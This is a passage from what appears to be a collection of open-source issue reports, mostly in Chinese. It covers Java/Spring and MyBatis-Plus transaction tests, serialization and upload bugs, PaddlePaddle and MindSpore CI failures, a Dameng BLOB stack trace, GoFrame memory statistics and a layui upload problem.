definition.setPropagationBehavior(TransactionDefinition.PROPAGATION_REQUIRED); TransactionStatus transaction = null; try { transaction = platformTransactionManager.getTransaction(definition); User user2 = new User(); user2.setId(2); user2.setAge(12); boolean insert2 = userService.insert(user2); Condition condition = Condition.create(); condition.eq(""id"",1); List list = userService.selectList(condition); User user3 = new User(); user3.setId(3); user3.setAge(13); boolean insert3 = userService.insert(user3); platformTransactionManager.commit(transaction); } catch (Exception e) { if(null != transaction) { platformTransactionManager.rollback(transaction); } } } } package com.baomidou.samples.mybatisplus2.test; import com.baomidou.samples.mybatisplus2.Application; import com.baomidou.samples.mybatisplus2.manager.ProcessManager; import org.junit.Before; import org.junit.Test; import org.junit.runner.RunWith; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.boot.test.context.SpringBootTest; import org.springframework.test.context.junit4.SpringRunner; import javax.annotation.Resource; import javax.sql.DataSource; import java.sql.Connection; import java.sql.SQLException; @RunWith(SpringRunner.class) @SpringBootTest(classes = Application.class) public class ProcessManagerTest { @Resource private ProcessManager processManager; @Autowired private DataSource dataSource; @Before public void beforeTest() { try { Connection connection = dataSource.getConnection(); connection.createStatement().execute(""CREATE TABLE IF NOT EXISTS USER (\n"" + "" id BIGINT(20) NOT NULL AUTO_INCREMENT,\n"" + "" name VARCHAR(30) NULL DEFAULT NULL ,\n"" + "" age INT(11) NULL DEFAULT NULL ,\n"" + "" PRIMARY KEY (id)\n"" + "");""); connection.createStatement().execute(""CREATE TABLE IF NOT EXISTS addr (\n"" + "" id BIGINT(20) NOT NULL AUTO_INCREMENT,\n"" + "" name VARCHAR(30) NULL DEFAULT NULL ,\n"" + "" PRIMARY KEY (id)\n"" + "");""); connection.close(); } catch (SQLException e) { e.printStackTrace(); } } @Test public void test() { processManager.process(); } } public void process() { // DefaultTransactionDefinition definition = new DefaultTransactionDefinition(); // definition.setPropagationBehavior(TransactionDefinition.PROPAGATION_REQUIRED); // TransactionStatus transaction = null; // try { // transaction = platformTransactionManager.getTransaction(definition); User user2 = new User(); user2.setId(2); user2.setAge(12); boolean insert2 = userService.insert(user2); Condition condition = Condition.create(); condition.eq(""id"",1); List list = userService.selectList(condition); User user3 = new User(); user3.setId(3); user3.setAge(13); boolean insert3 = userService.insert(user3); // platformTransactionManager.commit(transaction); // } catch (Exception e) { // if(null != transaction) { // platformTransactionManager.rollback(transaction); // } // } }"
Model对象的序列化存在问题,"AuthToken、AuthResponse这两个对象fastjson序列化和反序列化结合会存在问题(无参构造缺失)，只用Lombok的@Builder注解时, 对象会缺失无参构造. 2. 在哪个步骤出现了问题？ 3. 您希望得到什么结果？ 期望结果 我看有人提过PR但是代码貌似没有合并过去 7364c20   <code>: @Getter @Setter @Builder public class AuthToken implements Serializable { ... } @Getter @Setter @Builder @NoArgsConstructor @AllArgsConstructor public class AuthToken implements Serializable { ... }"
商品编辑页面上传视频成功后关闭上传对话框无法获得准确视频地址,"public\static\common\js\common.js 1566,1567行应该改为   <code>: html += '&lt;input type=""text"" name=""'+$tag.data('form-name')+'"" value=""'+result[i].url+'"" /&gt;'; html += '&lt;video src=""'+result[i].url+'"" controls&gt;your browser does not support the video tag&lt;/video&gt;';"
conv2d_fusion has not been registered in demo_ci (cuda8 cudnn5),"http://ci.paddlepaddle.org/viewLog.html?buildId=50504&amp;tab=buildLog&amp;buildTypeId=Manylinux1_Cuda80cudnn5cp27cp27mu&amp;logTab=tree&amp;filter=all&amp;_focus=42873#_state=26528   <code>: [21:32:05][Step 5/8] --- Running IR pass [infer_clean_graph_pass] [21:32:05][Step 5/8] --- Running IR pass [conv_affine_channel_fuse_pass] [21:32:05][Step 5/8] --- Running IR pass [conv_eltwiseadd_affine_channel_fuse_pass] [21:32:05][Step 5/8] --- Running IR pass [conv_bn_fuse_pass] [21:32:05][Step 5/8] --- detect 53 subgraphs [21:32:05][Step 5/8] --- Running IR pass [conv_elementwise_add_act_fuse_pass] [21:32:05][Step 5/8] --- detect 33 subgraphs [21:32:05][Step 5/8] --- Running IR pass [conv_elementwise_add2_act_fuse_pass] [21:32:05][Step 5/8] --- Running IR pass [conv_elementwise_add_fuse_pass] [21:32:05][Step 5/8] --- detect 20 subgraphs [21:32:05][Step 5/8] --- Running IR pass [transpose_flatten6_concat_fuse_pass] [21:32:05][Step 5/8] --- Running IR pass [transpose_flatten5_concat_fuse_pass] [21:32:05][Step 5/8] --- Running IR pass [transpose_flatten4_concat_fuse_pass] [21:32:05][Step 5/8] --- Running IR pass [transpose_flatten3_concat_fuse_pass] [21:32:05][Step 5/8] I0117 21:32:05.376765 723 ir_params_sync_among_devices_pass.cc:34] Sync params from CPU to GPU [21:32:05][Step 5/8] I0117 21:32:05.914010 723 analysis_predictor.cc:355] == optimize end == [21:32:06][Step 5/8] terminate called after throwing an instance of 'paddle::platform::EnforceNotMet' [21:32:06][Step 5/8] what(): op_info_ptr should not be null [21:32:06][Step 5/8] Operator conv2d_fusion has not been registered at [/paddle/paddle/fluid/framework/op_info.h:84] [21:32:06][Step 5/8] PaddlePaddle Call Stacks: [21:32:06][Step 5/8] 0 0x10ce3d0p void paddle::platform::EnforceNotMet::Init&lt;std::string&gt;(std::string, char const*, int) + 384 [21:32:06][Step 5/8] 1 0x10ceaadp _ZN6paddle8platform13EnforceNotMetC1IJPKcSsEEES4_iDpT_ + 93 [21:32:06][Step 5/8] 2 0x219ac67p paddle::framework::OpRegistry::CreateOp(std::string const&amp;, std::map&lt;std::string, std::vector&lt;std::string, std::allocator&lt;std::string&gt; &gt;, std::less&lt;std::string&gt;, std::allocator&lt;std::pair&lt;std::string const, std::vector&lt;std::string, std::allocator&lt;std::string&gt; &gt; &gt; &gt; &gt; const&amp;, std::map&lt;std::string, std::vector&lt;std::string, std::allocator&lt;std::string&gt; &gt;, std::less&lt;std::string&gt;, std::allocator&lt;std::pair&lt;std::string const, std::vector&lt;std::string, std::allocator&lt;std::string&gt; &gt; &gt; &gt; &gt; const&amp;, std::unordered_map&lt;std::string, boost::variant&lt;boost::blank, int, float, std::string, std::vector&lt;int, std::allocator&lt;int&gt; &gt;, std::vector&lt;float, std::allocator&lt;float&gt; &gt;, std::vector&lt;std::string, std::allocator&lt;std::string&gt; &gt;, bool, std::vector&lt;bool, std::allocator&lt;bool&gt; &gt;, paddle::framework::BlockDesc*, long, std::vector&lt;paddle::framework::BlockDesc*, std::allocator&lt;paddle::framework::BlockDesc*&gt; &gt;, std::vector&lt;long, std::allocator&lt;long&gt; &gt;, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt;, std::hash&lt;std::string&gt;, std::equal_to&lt;std::string&gt;, std::allocator&lt;std::pair&lt;std::string const, boost::variant&lt;boost::blank, int, float, std::string, std::vector&lt;int, std::allocator&lt;int&gt; &gt;, std::vector&lt;float, std::allocator&lt;float&gt; &gt;, std::vector&lt;std::string, std::allocator&lt;std::string&gt; &gt;, bool, std::vector&lt;bool, std::allocator&lt;bool&gt; &gt;, paddle::framework::BlockDesc*, long, std::vector&lt;paddle::framework::BlockDesc*, std::allocator&lt;paddle::framework::BlockDesc*&gt; &gt;, std::vector&lt;long, std::allocator&lt;long&gt; &gt;, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; &gt; &gt; &gt;) + 215 [21:32:06][Step 5/8] 3 0x219ae16p paddle::framework::OpRegistry::CreateOp(paddle::framework::OpDesc const&amp;) + 102 [21:32:06][Step 5/8] 4 0x1201a44p paddle::framework::NaiveExecutor::CreateOps(paddle::framework::ProgramDesc const&amp;, int, bool) + 164 [21:32:06][Step 5/8] 5 0x12027fbp paddle::framework::NaiveExecutor::Prepare(paddle::framework::Scope*, paddle::framework::ProgramDesc const&amp;, int, bool) + 171 [21:32:06][Step 5/8] 6 0x10c5583p paddle::AnalysisPredictor::PrepareExecutor() + 51 [21:32:06][Step 5/8] 7 0x10ca4e5p paddle::AnalysisPredictor::Init(std::shared_ptr&lt;paddle::framework::Scope&gt; const&amp;, std::shared_ptr&lt;paddle::framework::ProgramDesc&gt; const&amp;) + 357 [21:32:06][Step 5/8] 8 0x10ca924p std::unique_ptr&lt;paddle::PaddlePredictor, std::default_delete&lt;paddle::PaddlePredictor&gt; &gt; paddle::CreatePaddlePredictor&lt;paddle::contrib::AnalysisConfig, (paddle::PaddleEngineKind)2&gt;(paddle::contrib::AnalysisConfig const&amp;) + 980 [21:32:06][Step 5/8] 9 0x10cb0f1p std::unique_ptr&lt;paddle::PaddlePredictor, std::default_delete&lt;paddle::PaddlePredictor&gt; &gt; paddle::CreatePaddlePredictor&lt;paddle::contrib::AnalysisConfig&gt;(paddle::contrib::AnalysisConfig const&amp;) + 17 [21:32:06][Step 5/8] 10 0x10be4a6p paddle::demo::Main(bool) + 351 [21:32:06][Step 5/8] 11 0x10bea85p main + 60 [21:32:06][Step 5/8] 12 0x7f9327e41d20p __libc_start_main + 256 [21:32:06][Step 5/8] 13 0x10bd191p [21:32:06][Step 5/8]"
请问ms-basic等依赖包的源码有开放么？,请问ms-basic等依赖包的源码有开放么？   <code>: &lt;dependency&gt; &lt;groupId&gt;net.mingsoft&lt;/groupId&gt; &lt;artifactId&gt;ms-base&lt;/artifactId&gt; &lt;version&gt;2.1.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;net.mingsoft&lt;/groupId&gt; &lt;artifactId&gt;ms-basic&lt;/artifactId&gt; &lt;version&gt;2.1.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;net.mingsoft&lt;/groupId&gt; &lt;artifactId&gt;ms-mdiy&lt;/artifactId&gt; &lt;version&gt;2.1.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;net.mingsoft&lt;/groupId&gt; &lt;artifactId&gt;store-client&lt;/artifactId&gt; &lt;version&gt;2.1.3&lt;/version&gt; &lt;/dependency&gt;
Add version info to *.whl files,Sometimes we may need to check the version of paddlepaddle in python code to ensure we are using the proper version of paddlepaddle. Shall we add a variable to the paddle module?   <code>: __version__
Module build failed: BrowserslistError: Unknown browser query `dead` 报错处理,"关于拉取代码报 'dead' 错误处理 参考链接*   <code>: ""browserslist"": [ ""last 2 versions"", ""android 4"", ""opera 12"" ]"
BUG--springblade2.9.1.RELEASE连接达梦blob报错,"一、该问题的重现步骤是什么？ 获取达梦blob数据报错,查询就会报错， 当blob数据一般是多行时，必然报错，如果blob数据量大，一般是浏览数据出现多行时候，就会出现这个问题 select * from A 数据库： CREATE TABLE ""SYSDBA"".""a"" ( ""xx"" BLOB) STORAGE(ON ""MAIN"", CLUSTERBTR) ; private byte[] xx; } org.springframework.jdbc.UncategorizedSQLException: Error attempting to get column 'xx' from result set. Cause: java.sql.SQLException: Error ; uncategorized SQLException; SQL state [null]; error code [0]; Error; nested exception is java.sql.SQLException: Error Caused by: java.sql.SQLException: Error Caused by: java.lang.RuntimeException: index out of range   <code>: Copyright (c) 2018-2028, Chill Zhuang All rights reserved. at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:89) at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:81) at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:81) at org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:91) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:441) at com.sun.proxy.$Proxy169.selectList(Unknown Source) at org.mybatis.spring.SqlSessionTemplate.selectList(SqlSessionTemplate.java:224) at com.baomidou.mybatisplus.core.override.MybatisMapperMethod.executeForMany(MybatisMapperMethod.java:166) at com.baomidou.mybatisplus.core.override.MybatisMapperMethod.execute(MybatisMapperMethod.java:77) at com.baomidou.mybatisplus.core.override.MybatisMapperProxy$PlainMethodInvoker.invoke(MybatisMapperProxy.java:148) at com.baomidou.mybatisplus.core.override.MybatisMapperProxy.invoke(MybatisMapperProxy.java:89) at com.sun.proxy.$Proxy172.selectAPage(Unknown Source) at org.springblade.system.controller.ApiScopeController.a(ApiScopeController.java:67) at org.springblade.system.controller.ApiScopeController$$FastClassBySpringCGLIB$$9b4c5776.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:779) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:750) at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:88) at org.springblade.core.log.aspect.RequestLogAspect.aroundApi(RequestLogAspect.java:114) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:644) at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:633) at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:70) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:175) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:750) at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:95) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:750) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:692) at org.springblade.system.controller.ApiScopeController$$EnhancerBySpringCGLIB$$7fe6fc45.a(&lt;generated&gt;) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:105) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:878) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:792) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898) at javax.servlet.http.HttpServlet.service(HttpServlet.java:497) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:584) at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) at org.springblade.core.log.filter.LogTraceFilter.doFilter(LogTraceFilter.java:39) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springblade.core.boot.request.BladeRequestFilter.doFilter(BladeRequestFilter.java:53) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:97) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:111) at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:269) at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:78) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:133) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:130) at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:249) at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:78) at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:99) at io.undertow.server.Connectors.executeRootHandler(Connectors.java:390) at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:836) at org.jboss.threads.ContextClassLoaderSavingRunnable.run(ContextClassLoaderSavingRunnable.java:35) at org.jboss.threads.EnhancedQueueExecutor.safeRun(EnhancedQueueExecutor.java:2019) at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.doRunTask(EnhancedQueueExecutor.java:1558) at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.run(EnhancedQueueExecutor.java:1449) at java.lang.Thread.run(Thread.java:748) at com.alibaba.druid.pool.DruidDataSource.handleConnectionException(DruidDataSource.java:1811) at com.alibaba.druid.pool.DruidPooledConnection.handleException(DruidPooledConnection.java:137) at com.alibaba.druid.pool.DruidPooledStatement.checkException(DruidPooledStatement.java:93) at com.alibaba.druid.pool.DruidPooledResultSet.checkException(DruidPooledResultSet.java:54) at com.alibaba.druid.pool.DruidPooledResultSet.getBytes(DruidPooledResultSet.java:340) at org.apache.ibatis.type.ByteArrayTypeHandler.getNullableResult(ByteArrayTypeHandler.java:37) at org.apache.ibatis.type.ByteArrayTypeHandler.getNullableResult(ByteArrayTypeHandler.java:26) at org.apache.ibatis.type.BaseTypeHandler.getResult(BaseTypeHandler.java:85) at org.apache.ibatis.executor.resultset.DefaultResultSetHandler.getPropertyMappingValue(DefaultResultSetHandler.java:512) at org.apache.ibatis.executor.resultset.DefaultResultSetHandler.applyPropertyMappings(DefaultResultSetHandler.java:481) at org.apache.ibatis.executor.resultset.DefaultResultSetHandler.getRowValue(DefaultResultSetHandler.java:405) at org.apache.ibatis.executor.resultset.DefaultResultSetHandler.handleRowValuesForSimpleResultMap(DefaultResultSetHandler.java:355) at org.apache.ibatis.executor.resultset.DefaultResultSetHandler.handleRowValues(DefaultResultSetHandler.java:329) at org.apache.ibatis.executor.resultset.DefaultResultSetHandler.handleResultSet(DefaultResultSetHandler.java:302) at org.apache.ibatis.executor.resultset.DefaultResultSetHandler.handleResultSets(DefaultResultSetHandler.java:195) at org.apache.ibatis.executor.statement.PreparedStatementHandler.query(PreparedStatementHandler.java:65) at org.apache.ibatis.executor.statement.RoutingStatementHandler.query(RoutingStatementHandler.java:79) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:64) at com.sun.proxy.$Proxy262.query(Unknown Source) at org.apache.ibatis.executor.SimpleExecutor.doQuery(SimpleExecutor.java:63) at org.apache.ibatis.executor.BaseExecutor.queryFromDatabase(BaseExecutor.java:325) at org.apache.ibatis.executor.BaseExecutor.query(BaseExecutor.java:156) at com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor.intercept(MybatisPlusInterceptor.java:81) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:62) at com.sun.proxy.$Proxy261.query(Unknown Source) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:151) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:145) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:140) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:427) ... 101 common frames omitted at dm.jdbc.b.a.a.f(Buffer.java:791) at dm.jdbc.b.a.a.k(Buffer.java:772) at dm.jdbc.b.a.a.readLong(Buffer.java:712) at dm.jdbc.b.b.j.v(GET_LOB_DATA.java:116) at dm.jdbc.b.b.j.q(GET_LOB_DATA.java:1) at dm.jdbc.b.b.o.C(MSG.java:501) at dm.jdbc.b.a.a(DBAccess.java:219) at dm.jdbc.b.a.a(DBAccess.java:1031) at dm.jdbc.b.a.a(DBAccess.java:947) at dm.jdbc.driver.DmdbBlob.do_getBytes(DmdbBlob.java:125) at dm.jdbc.driver.DmdbBlob.loadAllData(DmdbBlob.java:311) at dm.jdbc.driver.DmdbBlob.&lt;init&gt;(DmdbBlob.java:53) at dm.jdbc.driver.DmdbBlob.newInstanceFromDB(DmdbBlob.java:74) at dm.jdbc.convert.DB2J.toBytes(DB2J.java:866) at dm.jdbc.driver.DmdbResultSet.do_getBytes(DmdbResultSet.java:756) at dm.jdbc.driver.DmdbResultSet.do_getBytes(DmdbResultSet.java:1099) at dm.jdbc.driver.DmdbResultSet.getBytes(DmdbResultSet.java:2533) at com.alibaba.druid.filter.FilterChainImpl.resultSet_getBytes(FilterChainImpl.java:1225) at com.alibaba.druid.filter.FilterAdapter.resultSet_getBytes(FilterAdapter.java:1544) at com.alibaba.druid.filter.FilterChainImpl.resultSet_getBytes(FilterChainImpl.java:1223) at com.alibaba.druid.proxy.jdbc.ResultSetProxyImpl.getBytes(ResultSetProxyImpl.java:340) at com.alibaba.druid.pool.DruidPooledResultSet.getBytes(DruidPooledResultSet.java:338) ... 133 common frames omitted"
[ST][MS][CI][cv][textrcnn_lstm][ascend 1p][2.0.0-alpha]性能劣化,"textrcnn_lstm在 ascend1p 性能6450低于标杆6800 / 硬件环境: /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : minspore:2.0.0a0 commit_id=''[sha1]:375750d4,[branch]:(HEAD,origin/r2.0.0-alpha,r2.0.0-alpha)'' (/): /mode graph test_ms_textrcnn_lstm_movie_review_word2vec_train_infer_910_gpu_1p_0001.py pytest -s test_ms_textrcnn_lstm_movie_review_word2vec_train_infer_910_gpu_1p_0001.py 性能达标 走给安正气   <code>: INFO test_ms_textrcnn_lstm_movie_review_word2vec_train_infer_910_gpu_1p_0001DFM4yElr:test_ms_textrcnn_lstm_movie_review_word2vec_train_infer_910_gpu_1p_0001.py:132 Train times[3/5], FPS:6450, step time:9.92, Accuracy:0.793945312"
error while loading shared libraries: libhidapi-hidraw.so.0: cannot open shared,运行 报错 ./openocd_linux: error while loading shared libraries: libhidapi-hidraw.so.0: cannot open shared object file: No such file or directory   <code>: ./openocd_linux -f ../../sim/jtag_debug.cfg
go frame 1.2.11版本相比1.0.898性能明显下降,"今天我将gf框架从1.0.898升级到了1.2.11版本,以前启动只需两三秒,升级后启动竟然需要2分钟左右,内存分配也非常高,启动完成后gc就高达1300次左右   <code>: # runtime.MemStats # Alloc = 25367920 # TotalAlloc = 33124714304 # Sys = 283867384 # Lookups = 0 # Mallocs = 195721337 # Frees = 195457876 # HeapAlloc = 25367920 # HeapSys = 267157504 # HeapIdle = 218292224 # HeapInuse = 48865280 # HeapReleased = 217513984 # HeapObjects = 263461 # Stack = 1212416 / 1212416 # MSpan = 1044088 / 1490944 # MCache = 5184 / 16384 # BuckHashSys = 3278518 # GCSys = 9662464 # OtherSys = 1049154 # NextGC = 48391216 # LastGC = 1542872674554663789 # NumGC = 1404 # NumForcedGC = 0 # GCCPUFraction = 0.0014209221081895344 # DebugGC = false # runtime.MemStats # Alloc = 6123584 # TotalAlloc = 1659623768 # Sys = 71497976 # Lookups = 0 # Mallocs = 16340104 # Frees = 16311519 # HeapAlloc = 6123584 # HeapSys = 66158592 # HeapIdle = 58368000 # HeapInuse = 7790592 # HeapReleased = 58097664 # HeapObjects = 28585 # Stack = 950272 / 950272 # MSpan = 88312 / 131072 # MCache = 1728 / 16384 # BuckHashSys = 1523912 # GCSys = 2379776 # OtherSys = 337968 # NextGC = 9297408 # LastGC = 1542872951177283761"
多图上传第一次可以成功，第二次触达的时候，就没有触发到,"这是使用的到js： layui.use('upload', function(){ var upload= layui.upload; 这是div： <div> <a type=""button"">多图上传 预览产品宣传图： <div> 如下图，第二次可以触发到选择文件筐，但选择文件之后就没有继续执行了，大神谁遇到过，求指点   <code>: alert(""000000-----""); //多图上传 //创建一个实例 var uploadInst = upload.render({ elem: '#test2' ,url: ""&lt;c:url value='/oss/upload'/&gt;"" //OSS图片上传 ,auto: true //选择文件后不自动上传 ,exts: 'jpg|png|jpeg|gif|bmp' //图片格式校验 ,multiple: true ,before: function(obj){ alert(""dhjkafgdfjkhgjksdfh ""); //上传提示窗口 layer.msg('图片上传中...', { icon: 16, shade: 0.01, time: 0 }) } ,done: function(res){ alert(""上传成功了说==============""); layer.close(layer.msg());//关闭上传提示窗口 $('#uploader-list').append( '&lt;div id="""" class=""file-iteme""&gt;' + '&lt;div class=""handle""&gt;&lt;span class=""glyphicon glyphicon-trash"" title=""删除""&gt;X&lt;/span&gt;&lt;/div&gt;' + '&lt;img style=""width: 100px;height: 100px;"" dataimg_id="""" src='+ res.url +' &gt;' + '&lt;/div&gt;' ); //每次执行之后都删除上传按钮 在前面重新加 // $(""#test2"").remove(); },error: function(res){ //请求异常回调 layer.open({ type: 1 ,offset: 'auto' //具体配置参考：http://www.layui.com/doc/modules/layer.html#offset ,id: 'uploader-list' //防止重复弹出 ,content: '&lt;div style=""padding: 20px 100px;""&gt;'+ res.message +'&lt;/div&gt;' ,btn: '关闭全部' ,btnAlign: 'c' //按钮居中 